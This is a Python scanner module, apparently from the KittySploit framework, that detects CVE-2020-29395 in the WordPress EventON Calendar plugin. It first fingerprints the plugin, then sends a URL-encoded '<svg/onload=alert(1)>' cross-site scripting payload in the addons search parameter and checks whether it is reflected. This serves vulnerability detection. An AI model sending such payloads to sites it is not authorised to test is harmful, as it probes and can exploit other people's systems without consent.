#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Wordpress EventON Calendar 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Wordpress EventON Calendar 3.0.5 - Cross-Site Scripting Detection',
        'description': 'Wordpress EventON Calendar 3.0.5 is vulnerable to cross-site scripting because it allows addons/?q= XSS via the search field.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'wordpress', 'xss', 'wp-plugin', 'packetstorm', 'myeventon', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/mustgundogdu/Research/tree/main/EventON_PLUGIN_XSS',
            'https://www.myeventon.com/news/',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-29395',
            'http://packetstormsecurity.com/files/160282/WordPress-EventON-Calendar-3.0.5-Cross-Site-Scripting.html',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2020-29395',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('/wp-content/plugins/eventON/',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/addons/?q=%3Csvg%2Fonload%3Dalert(1)%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<svg/onload=alert(1)>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Wordpress EventON Calendar 3.0.5 - Cross-Site Scripting detected', path=path)
            return True
        return False

